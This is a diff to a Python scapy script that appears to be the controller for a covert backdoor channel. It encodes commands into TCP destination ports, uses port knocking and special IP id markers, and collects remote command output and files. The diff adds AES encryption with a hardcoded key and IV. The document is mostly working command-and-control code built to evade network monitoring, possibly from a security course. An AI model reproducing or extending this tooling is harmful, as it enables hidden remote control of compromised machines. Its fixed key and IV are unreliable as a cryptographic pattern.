@@ -8,8 +8,8 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from Crypto.Cipher import AES
 from random import randint
-
 MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
+INIT_VALUE = "JohnCenaTheChamp"
 OUTPUT = collections.defaultdict(list)
 
 
@@ -32,7 +32,8 @@ def verify_root():
 
 def binary_to_file(binary):
 	string = ''.join(binary)
-	filename, data = string.split('\0', 1)
+	decrypted =  decrypt_val(string)
+	filename, data = decrypted.split('\0', 1)
 	data = data.rstrip('\0').rstrip('\n')
 	with open(filename, "wb") as f:
 		f.write(data)
@@ -51,6 +52,7 @@ def char_packet(dest, sport, char1, char2=None):
 		destport = ord(char1) << 8
 	else:
 		destport = (ord(char1) << 8) + ord(char2)
+	print(char1, char2, sport, destport)
 	return IP(dst=dest) / TCP(sport=sport, dport=destport)
 
 
@@ -60,9 +62,9 @@ def knock(destIP, ports):
 		send(packet)
 
 
-def send_end_msg(dest):
+def send_end_msg(dest, sport):
 	randPort = randint(1500, 65535)
-	packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=80)
+	packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=sport)
 	send(packet)
 
 
@@ -87,7 +89,8 @@ def get_result(packet):
 	global OUTPUT
 	sport = packet[2].sport
 	if(packet[1].id == 42424):
-		print(''.join(OUTPUT[sport]))
+		result = ''.join(OUTPUT[sport])
+		print(decrypt_val(result))
 		OUTPUT[sport] = ""
 		return True
 	elif(packet[1].id == 41414):
@@ -106,6 +109,7 @@ def get_result(packet):
 
 
 def send_cmd(msg):
+	msg = encrypt_val(msg)
 	sport = generate_port()
 	for char1, char2 in zip(msg[0::2], msg[1::2]):
 		delay_sleep()
@@ -113,7 +117,7 @@ def send_cmd(msg):
 	if(len(msg) % 2):
 		delay_sleep()
 		send(char_packet(args.destIP, sport, msg[len(msg) - 1]))
-	send_end_msg(args.destIP)
+	send_end_msg(args.destIP, sport)
 
 
 def main():
